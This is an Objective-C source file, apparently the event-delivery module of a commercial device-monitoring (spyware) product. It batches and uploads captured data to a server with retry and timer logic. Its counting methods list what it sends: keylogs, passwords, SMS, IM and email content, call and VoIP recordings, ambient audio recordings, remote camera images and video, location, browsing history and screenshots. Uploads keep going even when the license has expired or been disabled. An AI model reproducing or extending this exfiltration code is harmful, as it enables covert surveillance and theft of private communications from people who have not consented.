//
//  EventDeliveryManager.m
//  EDM
//
//  Created by Makara Khloth on 10/27/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "EventDeliveryManager.h"
#import "EventKeysDatabase.h"
#import "EventKeysDAO.h"
#import "RegularEventDataProvider.h"
#import "ThumbnailEventDataProvider.h"
#import "SystemEventDataProvider.h"
#import "PanicEventDataProvider.h"
#import "ActualEventDataProvider.h"
#import "SettingsEventDataProvider.h"
#import "NTMediaEventDataProvider.h"
#import "LargeRegularEventDataProvider.h"

#import "DeliveryRequest.h"
#import "DeliveryResponse.h"

#import "RepositoryChangePolicy.h"
#import "EventKeys.h"
#import "EventCount.h"
#import "DetailedCount.h"

#import "FxVoIPEvent.h"

#import "SendEvent.h"

#import "DaemonPrivateHome.h"
#import "LicenseManager.h"
#import "LicenseInfo.h"

/****************************************************************************************************************
 Note: [TESTED IN TEST ENVIRONMENT, PRODUCTION ENVIRONMENT MAY BE NOT BETTER THAN TEST ONE]
    Server need time approximately 4 minutes to resume each request thus retry count & delay time are
    really matter to the success of resume request. Each retry should have 2 minutes delay & retry count more
    than 2 because even application attempt to retry less than 2 minutes server is very likely to return
    "Server Busy Processing CSID".
 
    If a request has number of retry less than 2 and retry delay less than 2 minutes this request is likely fail
    to resume beause above reason.
 ****************************************************************************************************************/

static const NSInteger kCSMConnectionTimeout	= 60;       // 1 minute

static const NSInteger kPanicEventMaxRetry		= 64;       // 64 times
static const NSInteger kPanicEventDelayRetry	= 10;       // 10 secs
static const NSInteger kRegularEventMaxRetry	= 8;        // 8 times
static const NSInteger kRegularEventDelayRetry	= 2 * 60;   // 2 minutes
static const NSInteger kActualMediaMaxRetry		= 20;       // 20 times
static const NSInteger kActualMediaDelayRetry	= 60;       // 1 minute
static const NSInteger kThumbnailEventMaxRetry	= 20;       // 20 times
static const NSInteger kThumbnailEventDelayRetry= 2 * 60;   // 2 minutes
static const NSInteger kSystemEventMaxRetry		= 4;        // 4 times
static const NSInteger kSystemEventDelayRetry	= 2 * 60;   // 2 minutes
static const NSInteger kSettingsEventMaxRetry	= 4;        // 3 times
static const NSInteger kSettingsEventDelayRetry	= 2 * 60;   // 4 minutes

@interface EventDeliveryManager (private)

- (DeliveryRequest*) regularEventRequest;
- (DeliveryRequest*) panicEventRequest;
- (DeliveryRequest*) thumbnailRequest;
- (DeliveryRequest*) actualEventRequest;
- (DeliveryRequest*) systemEventRequest;
- (DeliveryRequest*) settingsEventRequest;
- (DeliveryRequest*) mediaNoThumbnailEventRequest;

- (void) registerCallerIDWithDDM;
- (void) registerEventRepositoryChange;
- (void) deliverRemainEvents;

- (NSInteger) countRegularEvents: (EventCount *) aEventCount;
- (NSInteger) countThumbnailEvents: (EventCount *) aEventCount;
- (NSInteger) countPanicEvents: (EventCount *) aEventCount;
- (NSInteger) countMediaNoThumbnailEvents: (EventCount *) aEventCount;
- (NSInteger) countSettingsEvents: (EventCount *) aEventCount;
- (NSInteger) countSystemEvents: (EventCount *) aEventCount;

@end

@implementation EventDeliveryManager

@synthesize mActualMediaDeliveryDelegate;
@synthesize mSendNowDeliveryDelegate;

@synthesize mLicenseManager;

#pragma mark -
#pragma mark Public methods
#pragma mark -

- (id) initWithEventRepository: (id <EventRepository>) aEventRepository andDataDelivery: (id <DataDelivery>) aDataDelivery {
	if ((self = [super init])) {
		mMaximumEvent = 10;
		mEventRepository = aEventRepository;
		[mEventRepository retain];
		mDataDelivery = aDataDelivery;
		[mDataDelivery retain];
		NSString *path = [NSString stringWithFormat:@"%@edm/", [DaemonPrivateHome daemonPrivateHome]];
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
		mEventKeyDatabase = [[EventKeysDatabase alloc] initWithDatabasePathAndOpen:[NSString stringWithFormat:@"%@fxeventkeys.db", path]];
		mRegularEventProvider = [[RegularEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mThumbnailEventDataProvider = [[ThumbnailEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mSystemEventDataProvider = [[SystemEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mPanicEventDataProvider = [[PanicEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mActualEventDataProvider = [[ActualEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mSettingsEventDataProvider = [[SettingsEventDataProvider alloc] initWithEventRepository:mEventRepository andEventKeysDatabase:mEventKeyDatabase];
		mNTMediaEventDataProvider = [[NTMediaEventDataProvider alloc] initWithEventRepository:mEventRepository eventKeysDatabase:mEventKeyDatabase];
        mLargeRegularEventProvider = [[LargeRegularEventDataProvider alloc] initWithEventRepository:mEventRepository eventKeysDatabase:mEventKeyDatabase];
		[self registerCallerIDWithDDM]; 
	}
	return (self);
}

- (void) setMaximumEvent: (NSInteger) aMaxEvent {
	// Max event
	if (aMaxEvent > 0 && aMaxEvent <= 500) {
		mMaximumEvent = aMaxEvent;
		if (mDeliveryTimerInterval != 0) {  // Not deliver (= not notify)
			[mEventRepository removeRepositoryChangeListener:self];
			[self registerEventRepositoryChange];
		}
	}
}

- (void) setDeliveryTimer: (NSInteger) aHour {
	// Hour
	if (aHour == 0) {
		mDeliveryTimerInterval = aHour;
		[mEventRepository removeRepositoryChangeListener:self]; // Not deliver (= not notify)
		if (mDeliveryTimer) {
			if ([mDeliveryTimer isValid]) {
				[mDeliveryTimer invalidate];
			}
			mDeliveryTimer = nil;
		}
	} else if (aHour != mDeliveryTimerInterval) {
		if (aHour > 0 && aHour <= 24) {
			mDeliveryTimerInterval = aHour;
			if (mDeliveryTimer) {
				if ([mDeliveryTimer isValid]) {
					[mDeliveryTimer invalidate];
				}
				mDeliveryTimer = nil;
			}
			mDeliveryTimer = [NSTimer scheduledTimerWithTimeInterval:mDeliveryTimerInterval * 60 * 60 target:self selector:@selector(maxEventReached) userInfo:nil repeats:YES];
			[mEventRepository removeRepositoryChangeListener:self];
			[self registerEventRepositoryChange];
		}
	}
}

- (void) explicitlyNotifyEmergencyEvents {
	[mEventRepository removeRepositoryChangeListener:self];
	[self registerEventRepositoryChange];
}

- (void) explicitlyCancelNotifyEmergencyEvents {
	[mEventRepository removeRepositoryChangeListener:self];
}

#pragma mark -
#pragma mark EventDelivery protocol methods
#pragma mark -

- (void) deliverRegularEvent {
	DeliveryRequest* request = [self regularEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mRegularEventProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (BOOL) deliverAllEventNowWithDeliveryEventDelegate: (id <DeliveryEventDelegate>) aDelegate {
	BOOL success = FALSE;
	if (!mSendingAllEventsNow) {
		EventCount *eventCount = [mEventRepository eventCount];
		// Panic
		NSInteger panicCount = [self countPanicEvents:eventCount];
		if (panicCount > 0) {
			[self deliverPanicEvent];
		}
		// Settings
		NSInteger settingsCount = [self countSettingsEvents:eventCount];
		if (settingsCount > 0) {
			[self deliverSettingsEvent];
		}
		// System
		[self deliverSystemEvent];
		// Regular
		[self deliverRegularEvent];
		// Thumbnail
		NSInteger thumbnailCount = [self countThumbnailEvents:eventCount];
		if (thumbnailCount > 0) {
			[self deliverThumbnailEvent];
		}
		// Media event without thumbnail
		NSInteger ntMediaCount = [self countMediaNoThumbnailEvents:eventCount];
		if (ntMediaCount > 0) {
			[self deliverMediaNoThumbnailEvent];
		}
        // Regular (large)
        NSInteger largeCount = [self countLargeRegularEvents:eventCount];
        if (largeCount > 0) {
            [self deliverLargeEvent];
        }
		
		[self setMSendNowDeliveryDelegate:aDelegate];
		mSendingAllEventsNow = TRUE;
		success = TRUE;
	}
	DLog(@"Delivery events now is sucess: %d", success)
	return (success);
}

- (void) deliverThumbnailEvent {
	DeliveryRequest* request = [self thumbnailRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mThumbnailEventDataProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:0];
		[request setMEncryptionFlag:0];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (BOOL) deliverActualMediaWithPairId: (NSInteger) aPairId andDeliveryEventDelegate: (id <DeliveryEventDelegate>) aDelegate {
	BOOL success = FALSE;
	if (!mDeliveringAcutalMedia) {
		DeliveryRequest* request = [self actualEventRequest];
		if (![mDataDelivery isRequestIsPending:request]) {
			SendEvent* sendEvent = [mActualEventDataProvider commandData:aPairId];
			[request setMCommandCode:[sendEvent getCommand]];
			[request setMCompressionFlag:0];
			[request setMEncryptionFlag:0];
			[request setMCommandData:sendEvent];
			[request setMDeliveryListener:self];
			[mDataDelivery deliver:request];
			
			[self setMActualMediaDeliveryDelegate:aDelegate];
			mDeliveringAcutalMedia = TRUE;
			success = TRUE;
		} else {
			// Check whether pairing id is persist in the request
			EventKeysDAO *eventKeysDAO = [[EventKeysDAO alloc] initWithDatabase:[mEventKeyDatabase mDatabase]];
			EventKeys *eventKeys = [eventKeysDAO selectEventKeys:kEDPTypeActualMeida];
			for (NSNumber* eventType in [eventKeys eventTypeArray]) {
				for (NSNumber* pairId in [eventKeys eventIdArray:(FxEventType)[eventType intValue]]) {
					if ([pairId intValue] == aPairId) {
						// The pairing id is persist
						[self setMActualMediaDeliveryDelegate:aDelegate];
						mDeliveringAcutalMedia = TRUE;
						success = TRUE;
						break;
					}
				}
				if (success) break;
			}
			[eventKeysDAO release];
		}
	}
	return (success);
}

- (void) deliverMediaNoThumbnailEvent {
	DeliveryRequest* request = [self mediaNoThumbnailEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mNTMediaEventDataProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:0];
		[request setMEncryptionFlag:0];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) deliverPanicEvent {
	DeliveryRequest* request = [self panicEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mPanicEventDataProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:0];
		[request setMEncryptionFlag:0];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) deliverAlertEvent {
}

- (void) deliverSettingsEvent {
	DeliveryRequest* request = [self settingsEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mSettingsEventDataProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) deliverSystemEvent {
	DeliveryRequest* request = [self systemEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mSystemEventDataProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) deliverLargeEvent {
    DeliveryRequest* request = [self largeRegularEventRequest];
    if (![mDataDelivery isRequestIsPending:request]) {
        SendEvent* sendEvent = [mLargeRegularEventProvider commandData];
        [request setMCommandCode:[sendEvent getCommand]];
        [request setMCompressionFlag:1];
        [request setMEncryptionFlag:1];
        [request setMCommandData:sendEvent];
        [request setMDeliveryListener:self];
        [mDataDelivery deliver:request];
    }
}

#pragma mark -
#pragma mark DDM callback
#pragma mark -

- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog(@"--->Enter<--- aResponse.mSuccess: %d, EDPType = %d", [aResponse mSuccess], [aResponse mEDPType]);
	if ([aResponse mEDPType] == kEDPTypeActualMeida) {
		if (mDeliveringAcutalMedia) {
			mDeliveringAcutalMedia = FALSE;
			[mActualMediaDeliveryDelegate eventDidDelivered:[aResponse mSuccess] withStatusCode:[aResponse mStatusCode] andStatusMessage:[aResponse mStatusMessage]];
		}
	} else if ([aResponse mEDPType] == kEDPTypeAllRegular || [aResponse mEDPType] == kEDPTypeSystem) {
		if (mSendingAllEventsNow) { // Assume SendNow is completed
			DLog(@"Delivery events now is completed");
			mSendingAllEventsNow = FALSE;
			[mSendNowDeliveryDelegate eventDidDelivered:[aResponse mSuccess] withStatusCode:[aResponse mStatusCode] andStatusMessage:[aResponse mStatusMessage]];
		}
	}
	
	DLog (@"Query event via type from EDP db")
	EventDataProvider* edp = [[EventDataProvider alloc] initWithEventKeysDatabase:mEventKeyDatabase];
	EventKeys* eventKeys = [edp selectEventKeys:[aResponse mEDPType]];
	DLog (@"Delete event keys: %@", eventKeys);
	if ([aResponse mSuccess]) {
		// Delete events from event repository
		if ([aResponse mEDPType] == kEDPTypeThumbnail) {
			for (NSNumber* eventType in [eventKeys eventTypeArray]) {
				for (NSNumber* pairId in [eventKeys eventIdArray:(FxEventType)[eventType intValue]]) {
					[mEventRepository updateMediaThumbnailStatus:[pairId intValue] withStatus:TRUE];
				}
			}
		} else if ([aResponse mEDPType] != kEDPTypeActualMeida) {
			[mEventRepository deleteEvent:eventKeys];
		}
	}
	// The request is finished now so delete event key references from event keys database
	
	// If EDP type is actual media, technically only one media is able to upload at a time thus this method still work fine
	// unless there is more than one actual media is being upload which mean that's BUG!!!
	DLog (@"Delete event key by EDP type")
	[edp deleteEventKeys:[aResponse mEDPType]];
	[edp release];
	
	EventCount *eventCount = [mEventRepository eventCount];
	DLog (@"EventCount in repository = %@", eventCount)
	
	LicenseInfo *licInfo = [mLicenseManager mCurrentLicenseInfo];
	
	if ([eventCount totalEventCount] > 0 && [licInfo licenseStatus] == ACTIVATED) {
		// Deiver the remaining events only when product is activated... to stop application is deliver system event to
		// server after deactivated indefintely
		if (!mDeliveryRemainEventsTimer) {
			if ([aResponse mSuccess]) {
				mEDMMaxFailCount = 0;
				mDeliveryRemainEventsTimer = [NSTimer scheduledTimerWithTimeInterval:1
																			  target:self
																			selector:@selector(deliverRemainEvents)
																			userInfo:nil
																			 repeats:NO];
			} else if (![aResponse mStillRetry]) {
				// Error and request cannot retry (resend in 1 minute for 5 times)
				mEDMMaxFailCount++;
				if (mEDMMaxFailCount <= 5) {
					mDeliveryRemainEventsTimer = [NSTimer scheduledTimerWithTimeInterval:60
																				  target:self
																				selector:@selector(deliverRemainEvents)
																				userInfo:nil
																				 repeats:NO];
				} else {
					mEDMMaxFailCount = 0;
				}
			}
		}
	}
	DLog (@"Complete EDM requestFinished")
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	DLog(@"Update progress aResponse = %@", aResponse)
}

#pragma mark -
#pragma mark RepositoryChangeListener
#pragma mark -

- (void) eventTypeAdded: (FxEventType) aEventType {
	DLog(@"--->Enter<--- aEventType: %d", aEventType)
	
	LicenseInfo *licInfo = [mLicenseManager mCurrentLicenseInfo];
	if ([licInfo licenseStatus] == ACTIVATED	||
		[licInfo licenseStatus] == EXPIRED		||
		[licInfo licenseStatus] == DISABLE		) {
		if (aEventType == kEventTypeSystem) {
			[self deliverSystemEvent];
		} else if (aEventType == kEventTypeLogon) {
			[self deliverRegularEvent]; // Specific to log on event
		} else if (aEventType == kEventTypeSettings) {
			[self deliverSettingsEvent];
		} else if (aEventType == kEventTypeBookmark) { // Obsolete event, must not call -------
			[self deliverRegularEvent]; // Specific to bookmark event
		} else if (aEventType == kEventTypeCallRecordAudio		||
                   aEventType == kEventTypeVoIPCallRecordAudio	||
				   aEventType == kEventTypeAmbientRecordAudio	||
				   aEventType == kEventTypeRemoteCameraImage	||
				   aEventType == kEventTypeRemoteCameraVideo	) {
			[self deliverMediaNoThumbnailEvent];
		}
	}
}

- (void) panicEventAdded {
	LicenseInfo *licInfo = [mLicenseManager mCurrentLicenseInfo];
	if ([licInfo licenseStatus] == ACTIVATED	||
		[licInfo licenseStatus] == EXPIRED		||
		[licInfo licenseStatus] == DISABLE		) {
		[self deliverPanicEvent];
		[self deliverRegularEvent];
	}
}

- (void) maxEventReached {
	DLog(@"--->Enter<---")
	
	LicenseInfo *licInfo = [mLicenseManager mCurrentLicenseInfo];
	if ([licInfo licenseStatus] == ACTIVATED	||
		[licInfo licenseStatus] == EXPIRED		||
		[licInfo licenseStatus] == DISABLE		) {
        // Regular
		[self deliverRegularEvent];
		
		// Thumbnail
		EventCount *eventCount = [mEventRepository eventCount];
		NSInteger thumbnailCount = [self countThumbnailEvents:eventCount];
		if (thumbnailCount > 0) {
			[self deliverThumbnailEvent];
		}
		
        // No thumbnail
		NSInteger ntMediaCount = [self countMediaNoThumbnailEvents:eventCount];
		if (ntMediaCount > 0) {
			[self deliverMediaNoThumbnailEvent];
		}
        
        // Regular (large)
        NSInteger largeCount = [self countLargeRegularEvents:eventCount];
        if (largeCount > 0) {
            [self deliverLargeEvent];
        }
	}
}

- (void) systemEventAdded {
}

- (void) eventAdded: (FxEvent *) aEvent {
	LicenseInfo *licInfo = [mLicenseManager mCurrentLicenseInfo];
	if ([licInfo licenseStatus] == ACTIVATED	||
		[licInfo licenseStatus] == EXPIRED		||
		[licInfo licenseStatus] == DISABLE		) {
		if ([aEvent eventType] == kEventTypeVoIP) {
			FxVoIPEvent *voIPEvent = (FxVoIPEvent *)aEvent;
			if ([voIPEvent mVoIPMonitor] == kFxVoIPMonitorYES) {
				[self deliverRegularEvent];
			}
		}
	}
}

#pragma mark -
#pragma mark DDM requests
#pragma mark -

- (DeliveryRequest*) regularEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:kRegularEventMaxRetry];
    [request setMEDPType:kEDPTypeAllRegular];
    [request setMRetryTimeout:kRegularEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) panicEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMMaxRetry:kPanicEventMaxRetry];
    [request setMEDPType:kEDPTypePanic];
    [request setMRetryTimeout:kPanicEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) thumbnailRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:kThumbnailEventMaxRetry];
    [request setMEDPType:kEDPTypeThumbnail];
    [request setMRetryTimeout:kThumbnailEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) actualEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyLow];
    [request setMMaxRetry:kActualMediaMaxRetry];
    [request setMEDPType:kEDPTypeActualMeida];
    [request setMRetryTimeout:kActualMediaDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) systemEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMMaxRetry:kSystemEventMaxRetry];
    [request setMEDPType:kEDPTypeSystem];
    [request setMRetryTimeout:kSystemEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) settingsEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMMaxRetry:kSettingsEventMaxRetry];
    [request setMEDPType:kEDPTypeSettings];
    [request setMRetryTimeout:kSettingsEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) mediaNoThumbnailEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:20];
    [request setMEDPType:kEDPTypeNTMedia];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) largeRegularEventRequest {
    DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:8];
    [request setMEDPType:kEDPTypeAllLargeRegular];
    [request setMRetryTimeout:2*60];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
    [request autorelease];
    return (request);
}

- (void) registerCallerIDWithDDM {
	if ([mDataDelivery isRequestPendingForCaller:kDDC_EDM]) {
		DLog(@"Register caller ID with DDM")
		[mDataDelivery registerCaller:kDDC_EDM withListener:self];
	}
}

- (void) registerEventRepositoryChange {
	// Event added
	// Reach max
	RepositoryChangePolicy* policy = [[RepositoryChangePolicy alloc] init];
	[policy addRepositoryChangeEvent:kReposChangeAddEvent];
	[policy addRepositoryChangeEvent:kReposChangeReachMax];
	[policy addRepositoryChangeEvent:kReposChangeAddPanicEvent];
	[policy setMMaxNumber:mMaximumEvent];
	[mEventRepository addRepositoryListener:self withRepositoryChangePolicy:policy];
	[policy release];
}

#pragma mark -
#pragma mark Sending remain events
#pragma mark -

- (void) deliverRemainEvents {
	[mDeliveryRemainEventsTimer invalidate];
	mDeliveryRemainEventsTimer = nil;
	EventCount *eventCount = [mEventRepository eventCount];
	NSInteger regularCount = [self countRegularEvents:eventCount];
	if (regularCount > 0) {
		[self deliverRegularEvent];
	}
	NSInteger settingsCount = [self countSettingsEvents:eventCount];
	if (settingsCount > 0) {
		[self deliverSettingsEvent];
	}
	NSInteger systemCount = [self countSystemEvents:eventCount];
	if (systemCount > 0) {
		[self deliverSystemEvent];
	}
	NSInteger thumbnailCount = [self countThumbnailEvents:eventCount];
	if (thumbnailCount > 0) {
		[self deliverThumbnailEvent];
	}
	NSInteger panicCount = [self countPanicEvents:eventCount];
	if (panicCount > 0) {
		[self deliverPanicEvent];
	}
	NSInteger ntMediaCount = [self countMediaNoThumbnailEvents:eventCount];
	if (ntMediaCount > 0) {
		[self deliverMediaNoThumbnailEvent];
	}
    NSInteger largeCount = [self countLargeRegularEvents:eventCount];
    if (largeCount > 0) {
        [self deliverLargeEvent];
    }
}

#pragma mark -
#pragma mark Utils methods
#pragma mark -

- (NSInteger) countRegularEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	NSInteger regularCount = [[eventCount countEvent:kEventTypeCallLog] totalCount];
    regularCount += [[eventCount countEvent:kEventTypePassword] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeKeyLog] totalCount];
    regularCount += [[eventCount countEvent:kEventTypePageVisited] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeVoIP] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeSms] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeIM] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeIMAccount] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeIMContact] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeIMConversation] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeIMMessage] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeMms] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeMail] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeLocation] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeBrowserURL] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeBookmark] totalCount];
	regularCount += [[eventCount countEvent:kEventTypeApplicationLifeCycle] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeUsbConnection] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeFileTransfer] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeLogon] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeAppUsage] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeEmailMacOS] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeFileActivity] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeNetworkTraffic] totalCount];
    regularCount += [[eventCount countEvent:kEventTypeNetworkConnectionMacOS] totalCount];
	return (regularCount);
}

- (NSInteger) countThumbnailEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	// Thumbnail in event base table use actual media type as reference for count)
	NSInteger thumbnailCount = [[eventCount countEvent:kEventTypeCameraImage] totalCount];
	thumbnailCount += [[eventCount countEvent:kEventTypeAudio] totalCount];
	thumbnailCount += [[eventCount countEvent:kEventTypeVideo] totalCount];
	thumbnailCount += [[eventCount countEvent:kEventTypeWallpaper] totalCount];
	return (thumbnailCount);
}

- (NSInteger) countPanicEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	NSInteger panicCount = [[eventCount countEvent:kEventTypePanic] totalCount];
	panicCount += [[eventCount countEvent:kEventTypePanicImage] totalCount];
	return (panicCount);
}

- (NSInteger) countMediaNoThumbnailEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	NSInteger ntMediaCount = [[eventCount countEvent:kEventTypeCallRecordAudio] totalCount];
	ntMediaCount += [[eventCount countEvent:kEventTypeAmbientRecordAudio] totalCount];
	ntMediaCount += [[eventCount countEvent:kEventTypeRemoteCameraImage] totalCount];
	ntMediaCount += [[eventCount countEvent:kEventTypeRemoteCameraVideo] totalCount];
    ntMediaCount += [[eventCount countEvent:kEventTypeVoIPCallRecordAudio] totalCount];
	return (ntMediaCount);
}

- (NSInteger) countSettingsEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	NSInteger settingsCount = [[eventCount countEvent:kEventTypeSettings] totalCount];
	return (settingsCount);
}

- (NSInteger) countSystemEvents: (EventCount *) aEventCount {
	EventCount *eventCount = aEventCount;
	NSInteger systemCount = [[eventCount countEvent:kEventTypeSystem] totalCount];
	return (systemCount);
}

- (NSInteger) countLargeRegularEvents: (EventCount *) aEventCount {
    EventCount *eventCount = aEventCount;
    NSInteger largeRegularCount = [[eventCount countEvent:kEventTypeIMMacOS] totalCount];
    largeRegularCount += [[eventCount countEvent:kEventTypeScreenRecordSnapshot] totalCount];
    largeRegularCount += [[eventCount countEvent:kEventTypeAppScreenShot] totalCount];
    largeRegularCount += [[eventCount countEvent:kEventTypePrintJob] totalCount];
    return (largeRegularCount);
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
    [mLargeRegularEventProvider release];
	[mNTMediaEventDataProvider release];
	[mActualMediaDeliveryDelegate release];
	[mSendNowDeliveryDelegate release];
	[mSettingsEventDataProvider release];
	[mActualEventDataProvider release];
	[mPanicEventDataProvider release];
	[mSystemEventDataProvider release];
	[mThumbnailEventDataProvider release];
	[mRegularEventProvider release];
	[mEventKeyDatabase release];
	[mDataDelivery release];
	[mEventRepository release];
	[super dealloc];
}

@end
